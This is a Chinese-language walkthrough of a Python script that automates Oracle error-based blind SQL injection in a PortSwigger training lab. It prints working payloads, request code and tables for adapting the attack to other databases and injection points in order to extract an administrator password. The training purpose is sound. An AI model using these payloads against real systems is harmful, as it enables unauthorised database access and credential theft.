# `blind_sqli_error.py` 逐行讲解

> 配套脚本：`E:\dsh\sql\blind_sqli_error.py`（约 169 行）
> 适用题型：Oracle 盲 SQL 注入 · 条件错误型（PortSwigger «Blind SQL injection with conditional errors»）
> 阅读方式：按功能块组织，每块标注行号，可直接在对话里引用「第 X 行」提问

---

## 零、一句话原理

```sql
CASE WHEN ASCII(SUBSTR(password,pos,1)) > N
     THEN TO_CHAR(1/0)      -- 条件为真 → 除零 → HTTP 500
     ELSE 'a'               -- 条件为假 → 正常 → HTTP 200
END
```

**用「500 还是 200」当探针，再用二分查找把每个字符压到 7 次请求以内。**

---

## 一、整体流程

```
填配置(BASE_URL / TRACKING / LENGTH)
        ↓
参数检查(第 109 行:占位符没改就退出)
        ↓
通道自检(第 121 行:1=1 必炸、1=2 必不炸)
        ↓ 不通 → 退出
        ↓ 通
20 个位置并行 → 每位二分查找(find_char)
        ↓
拼装密码 → 输出
```

**关键设计：自检前置。** 盲注最难的是「分不清 500 是命中还是写错了」，自检把这个问题挡在跑数据之前。

---

## 二、第 1–27 行：文件头与导入

```python
1   #!/usr/bin/env python3
2   # -*- coding: utf-8 -*-
3-18 """Oracle 盲注(条件错误型)自动爆破脚本 ..."""
20  import concurrent.futures
21  import sys
22  import time
23  import urllib3
25  import requests
27  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```

| 行 | 内容 | 说明 |
|---|---|---|
| **1** | `#!/usr/bin/env python3` | Shebang。Linux/Mac 下 `./script.py` 直接运行时指定解释器。**Windows 无效，可忽略** |
| **2** | `# -*- coding: utf-8 -*-` | 声明源码 UTF-8，否则中文注释可能乱码 |
| **3–18** | `"""..."""` | 文件级文档字符串，`help()` 可查看 |
| **20** | `concurrent.futures` | 线程池，用于 20 个位置并行 |
| **21** | `sys` | 仅用于 `sys.exit()` |
| **22** | `time` | 计时 + 重试前 `sleep` |
| **23** | `urllib3` | 用于关闭 SSL 警告 |
| **25** | `requests` | HTTP 请求库（核心） |
| **27** | `disable_warnings` | 第 36 行关掉了证书校验，requests 会刷警告，这行静音 |

> **改造点**：若目标证书正常，可把第 36 行改 `True`，并删掉第 23、27 行。

---

## 三、第 29–37 行：配置区（最常改的地方）

```python
30  BASE_URL = "https://YOUR-LAB-ID.web-security-academy.net/"
31  SESSION = ""
32  TRACKING = "a3HRZtX4AN2q3pTa"
33  PASSWORD_LEN = 20
34  THREADS = 4
35  TIMEOUT = 20
36  VERIFY_SSL = False
```

| 行 | 作用 | 什么时候改 |
|---|---|---|
| **30** | 目标地址 | 换 lab 必改。**必须带 `https://` 和结尾 `/`** |
| **31** | session cookie | 需要登录态才有差异时填；否则留空 |
| **32** | **注入点原始值** | ⚠️ 最关键。填 TrackingId 原值（不含单引号） |
| **33** | 密码长度 | 先用 `length(password)>N` 手工确认 |
| **34** | 并发位数 | `4` 稳、`8` 快；被限流就调小 |
| **35** | 单次超时（秒） | 网络差调大 |
| **36** | 是否校验 SSL | 本地代理可能拦截证书，故 `False` |

> **设计意图**：所有可变量集中在顶部，换目标时只改这一块。

---

## 四、第 40–46 行：构造注入语句（脚本的核心）

```python
40  def build_payload(pos: int, ascii_val: int) -> str:
41      """构造注入后的 TrackingId"""
42      return (
43          f"{TRACKING}'and(select case when("
44          f"ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1))>{ascii_val}"
45          f") then to_char(1/0) else 'a' end from dual)='a'--"
46      )
```

**这段就是整个脚本的灵魂。** 拆成三段 `f-string` 只是为了换行易读，最终拼出：

```sql
a3HRZtX4AN2q3pTa' and(select case when(
  ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))>77
) then to_char(1/0) else 'a' end from dual)='a'--
```

| 行 | 拆解 | 改造点 |
|---|---|---|
| **43** | `{TRACKING}'` —— 原值 + 单引号闭合字符串 | 注入点若不是 `'` 包裹（数字型），这里要改 |
| **44** | `ASCII(SUBSTR((子查询),pos,1))>N` | **核心条件**：取第 pos 字符的 ASCII 码，判断是否 > N |
| **45** | `then to_char(1/0) else 'a' end from dual)='a'--` | 真→除零；假→返回 `'a'`；`--` 注释掉应用补的收尾引号 |

### 44 行的可替换部件

| 部件 | 当前值 | 换成 |
|---|---|---|
| `password` | 列名 | 目标列 |
| `users` | 表名 | 目标表 |
| `username='administrator'` | 过滤条件 | 目标用户 |
| `SUBSTR` | Oracle 函数 | MySQL/PG 用 `SUBSTRING` |

### 45 行：不同数据库的「报错装置」

| 数据库 | 制造错误的方式 |
|---|---|
| **Oracle** | `TO_CHAR(1/0)`（类型必须转成字符串） |
| PostgreSQL | `1/0`（可不转） |
| MySQL | `1/0`、`EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))` |

> **记忆点**：**44 行 = 「什么条件下崩」，45 行 = 「怎么让它崩」。**

---

## 五、第 49–53 行：发一个 HTTP 请求

```python
49  def send(cookie_value: str):
50      cookies = {"TrackingId": cookie_value}
51      if SESSION:
52          cookies["session"] = SESSION
53      return requests.get(BASE_URL, cookies=cookies, timeout=TIMEOUT, verify=VERIFY_SSL)
```

| 行 | 说明 |
|---|---|
| **50** | 构造 cookie 字典。**键名 `TrackingId` 必须与目标一致** |
| **51–52** | 有 session 才加，避免传空串污染 cookie |
| **53** | 发 GET；requests 自动处理 URL 编码 |

> **⭐ 换注入位置只改第 53 行：**

| 注入点 | 改法 |
|---|---|
| Cookie | `requests.get(BASE_URL, cookies={"TrackingId": v})` |
| URL 参数 | `requests.get(BASE_URL, params={"id": v})` |
| POST 表单 | `requests.post(BASE_URL, data={"id": v})` |
| 请求头 | `requests.get(BASE_URL, headers={"User-Agent": v})` |

---

## 六、第 56–69 行：单次探测（问一个是非题）

```python
56  def probe(pos: int, ascii_val: int) -> bool:
57      """True 表示 ASCII(SUBSTR(...)) > ascii_val(即触发了 500)"""
58      cookie = build_payload(pos, ascii_val)
59      for attempt in range(3):
60          try:
61              r = send(cookie)
62              if r.status_code == 500 or "Internal Server Error" in r.text:
63                  return True
64              return False
65          except Exception:
66              if attempt == 2:
67                  raise RuntimeError(f"probe failed: pos={pos}, ascii>{ascii_val}")
68              time.sleep(0.4)
69      return False
```

| 行 | 说明 |
|---|---|
| **58** | 生成本次要发的 SQL |
| **59** | 最多试 3 次，应对网络抖动 |
| **61** | 真的发请求 |
| **62** | ⭐ **判断「报错」的两条依据**：① 状态码 500 ② 页面含 `Internal Server Error`。用 `or`，命中任一即算 |
| **63** | 返回 `True` = 条件为真（真 → 除零 → 500） |
| **64** | 返回 `False` = 条件为假 |
| **65** | 网络异常（超时 / DNS）走这里 |
| **66–68** | 前两次失败等 0.4 秒重试；第 3 次仍失败则抛异常 |
| **69** | 理论不可达（循环内必有返回），防御性代码 |

> ⭐ **第 62 行是「漏洞类型」的开关。** 换题型主要改这里：

| 题型 | 判断依据 |
|---|---|
| **条件错误**（本脚本） | `r.status_code == 500` |
| **条件响应** | `"Welcome back" in r.text` |
| **时间盲注** | `r.elapsed.total_seconds() > 5` |
| **布尔盲注（长度差异）** | `len(r.text) > 1000` |
| **带外 / OOB** | 查 DNS 平台日志（不适合写进脚本） |

---

## 七、第 72–81 行：二分查找（核心算法）

```python
72  def find_char(pos: int) -> str:
73      """对第 pos 位做二分查找,返回该字符"""
74      lo, hi = 32, 126          # 可打印 ASCII 范围
75      while lo < hi:
76          mid = (lo + hi) // 2
77          if probe(pos, mid):
78              lo = mid + 1      # 字符码 > mid
79          else:
80              hi = mid          # 字符码 <= mid
81      return chr(lo)
```

| 行 | 说明 |
|---|---|
| **74** | 搜索范围：`32`（空格）~ `126`（`~`），即可打印字符 |
| **75** | 范围没缩到 1 个值就继续 |
| **76** | 取中点 |
| **77** | 问数据库：「这个字符的 ASCII 码**大于** mid 吗？」 |
| **78** | 是 → 在右半区 → 左边界抬到 `mid+1` |
| **80** | 否 → 在左半区 → 右边界降到 `mid` |
| **81** | 收敛后 `lo == hi`，就是 ASCII 码，转成字符 |

### 为什么 7 次一定能找到

```
32~126          95 个可能值
二分 1 次 →     47
二分 2 次 →     23
二分 3 次 →     11
二分 4 次 →      5
二分 5 次 →      2
二分 6 次 →      1   ← 确定
```

**log₂(95) ≈ 6.6，故最多 7 次。**

### 改造点

| 需求 | 改法 |
|---|---|
| 已知只有 `a-z0-9` | 第 74 行改 `lo, hi = 48, 122`，再过滤掉非法区间 |
| 逐位顺序执行（不计较慢） | 把 `probe` 换成顺序循环，不用线程池 |
| Unicode / 中文 | ASCII 二分**不适用**，改用 `SUBSTR(...)>'某字'` + 手工字符表 |

---

## 八、第 84–105 行：通道自检（开机自检）

```python
84  def sanity_check() -> bool:
85      """通道自检:用常量验证 1=1 报错、1=2 不报错"""
86      print("[*] 通道自检中...")
87      tests = [
88          ("1=1", f"{TRACKING}'and(select case when(1=1) then to_char(1/0) else 'a' end from dual)='a'--", True),
89          ("1=2", f"{TRACKING}'and(select case when(1=2) then to_char(1/0) else 'a' end from dual)='a'--", False),
90      ]
91      ok = True
92      for label, cookie, expect_error in tests:
93          try:
94              r = send(cookie)
95              got_error = (r.status_code == 500 or "Internal Server Error" in r.text)
96              mark = "OK " if got_error == expect_error else "!! "
97              if got_error != expect_error:
98                  ok = False
99              print(f"    [{mark}] {label:<4} -> HTTP {r.status_code} "
100                   f"({'500 报错' if got_error else '200 正常'}),预期"
101                   f"{'500' if expect_error else '200'}")
102         except Exception as e:
103             print(f"    [!! ] {label} 请求失败: {e}")
104             ok = False
105     return ok
```

| 行 | 说明 |
|---|---|
| **87–90** | 两个「答案已知」的用例：`1=1` 必报错、`1=2` 必正常 |
| **88 / 89** | **常量版 payload**，不引用任何列 —— 因此能验证「语法 + 数据库类型 + 报错装置」三件事 |
| **92** | 解包三元组：名字、要发的值、预期是否报错 |
| **94** | 发请求 |
| **95** | 用与第 62 行相同的逻辑算实际结果 |
| **96** | 对齐标记 `OK` / `!!` |
| **97–98** | 任一项不符即整体失败 |
| **99–101** | `{label:<4}` 左对齐占 4 字符，输出整齐 |
| **102–104** | 请求本身失败也算不通过 |

> **为什么值钱**：盲注最难的是「分不清 500 是命中还是写错了」。自检把这个问题前置 —— 不过就直接退出，不浪费 140 条请求。

---

## 九、第 108–160 行：主流程

### 108–119 行：参数检查与横幅

```python
109     if "YOUR-LAB-ID" in BASE_URL:
110-111     提示 + sys.exit(1)
113-119 print 横幅(目标 / 长度 / 并发 / 预估请求)
```

| 行 | 说明 |
|---|---|
| **109** | 防呆：忘改 `BASE_URL` 时直接退出，而不是请求一个不存在的域名 |
| **113–119** | 打印本次运行的参数，便于事后核对 |
| **118** | `PASSWORD_LEN * 7` 是预估请求数（每位约 7 次二分） |

### 121–125 行：自检闸门

```python
121     if not sanity_check():
122-123     提示 + sys.exit(2)
125     print("\n[*] 通道正常,开始二分爆破...\n")
```

**自检不过 → 退出码 2，一步都不往下走。**

### 127–132 行：准备并行

```python
127     chars = {p: "?" for p in range(1, PASSWORD_LEN + 1)}
128     started = time.time()
129     done = 0
131     with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
132         futures = {ex.submit(find_char, p): p for p in range(1, PASSWORD_LEN + 1)}
```

| 行 | 说明 |
|---|---|
| **127** | 结果字典，先全填 `?` |
| **128** | 记录开始时间 |
| **131** | 开线程池，最多 `THREADS` 个线程同时跑 |
| **132** | 每个位置提交一个任务；字典键是 `Future`、值是位置序号，便于反查 |

> ⭐ **132 行是「并行粒度」。** 若想改成「每 4 位一批」，把 `range` 改成 `range(1, LEN+1, 4)` 并让 `find_char` 处理范围。

### 133–144 行：收集结果

```python
133         for fut in concurrent.futures.as_completed(futures):
134             p = futures[fut]
135             try:
136                 ch = fut.result()
137                 chars[p] = ch
138                 done += 1
139                 current = "".join(chars[i] for i in range(1, PASSWORD_LEN + 1))
140-141             print(...)
142-144         except → 标记 '?' 并打印失败
```

| 行 | 说明 |
|---|---|
| **133** | **谁先完成先处理谁**（非顺序），所以输出顺序是乱的 |
| **134** | 反查这是第几位 |
| **136** | 取结果（任务抛过异常会在此重新抛出） |
| **137** | 存入字典 |
| **139** | 拼出当前已知部分（未知仍是 `?`），便于观察进度 |
| **142–144** | 某位失败不影响其他位，标记 `?` 继续 |

### 146–156 行：输出结果

```python
146     password = "".join(...)
149     if "?" not in password:
150-152     打印密码 + 用时
153-156 else: 打印未完成提示
```

**149 行**用「是否残留 `?`」判断成功与否 —— 简单可靠。

### 159–160 行：入口

```python
159 if __name__ == "__main__":
160     main()
```

**直接运行才执行 `main()`；被 `import` 时不执行**（所以才能只导入 `build_payload` 做测试）。

---

## 十、改造速查表

| 要改什么 | 改哪几行 |
|---|---|
| 目标地址 / 注入点初值 | **30、32** |
| 注入位置（Cookie → URL / POST / Header） | **53** |
| SQL 语句（表名、列名、函数） | **44、45** |
| 判断依据（500 / Welcome back / 延时） | **62** |
| 字符范围（只查 a-z0-9） | **74** |
| 并发数 / 超时 | **34、35** |
| 多跑一列（username + password） | **33**（长度）+ **44**（列名），复制一次 `find_char` 循环 |
| 换成时间盲注 | **62** 改判断 `r.elapsed.total_seconds()` |
| 换成布尔盲注（内容差异） | **62** 改判断页面特征字符串 |

---

## 十一、常见问题

### Q1：为什么 `probe` 返回 `True` 表示「字符更大」？

第 44 行问的是 `> ascii_val`。条件为真 → 第 45 行执行 `to_char(1/0)` → 500 → 第 62 行返回 `True`。
**所以 `True` = 「字符码比 mid 大」。**

### Q2：自检过了但爆破结果全错？

八成是 **第 44 行** 的表名/列名与实际不符。用这条手工验证：

```sql
'and(select case when(length(password)>0) then to_char(1/0) else 'a' end from users where username='administrator')='a'--
```

- **能 500** → 表和列都对，问题在别处
- **不 500** → 表名或列名错了

### Q3：全是 `?` / 大量 `probe failed`？

| 原因 | 处理 |
|---|---|
| **HTTP 504**（网关超时） | **lab 实例已过期**。`portswigger.net` 能开但 lab 域名 504，就是这个原因。回 lab 页面点 **Restart lab**，拿到**新 URL** 和**新 TrackingId**，改第 30、32 行；**密码也会变**，第 33 行要重新测 |
| 被限流 | 第 34 行 `THREADS = 2` |
| 网络慢 | 第 35 行 `TIMEOUT = 30` |
| Lab 过期 | 重开 lab，TrackingId 会变，改第 32 行 |
| 代理干扰 | 第 36 行 `VERIFY_SSL` 保持 `False`，检查系统代理 |

> **怎么区分"lab 过期"和"网络挂了"：**
> 打开 `https://portswigger.net/` —— 能开说明网络正常，那 lab 域名 504 就一定是实例被回收了。

### Q4：想同时跑多道题？

把配置区（第 30–36 行）改成参数，用 `argparse` 从命令行传入，`main()` 里接收即可。

---

## 十二、附：payload 结构速记

```
{TRACKING}                  ← 第 32 行,原始注入值
'                           ← 第 43 行,闭合应用的字符串
and(select case when(
  ASCII(SUBSTR((SELECT password FROM users
                WHERE username='administrator'),pos,1)) > N
) then to_char(1/0)         ← 第 44–45 行,真 → 崩
  else 'a' end from dual
)='a'                       ← 闭合子查询并与 'a' 比较
--                          ← 注释掉应用自带的收尾引号
```

**三个可变括弧:表名 / 列名 / 过滤条件。**
**两类可变装置:判断真假的函数(44)、制造错误的函数(45)。**

---

*文档对应脚本版本：`blind_sqli_error.py`（160 行）。若脚本行号变化，以代码中的函数名为准（`build_payload` / `send` / `probe` / `find_char` / `sanity_check` / `main`）。*
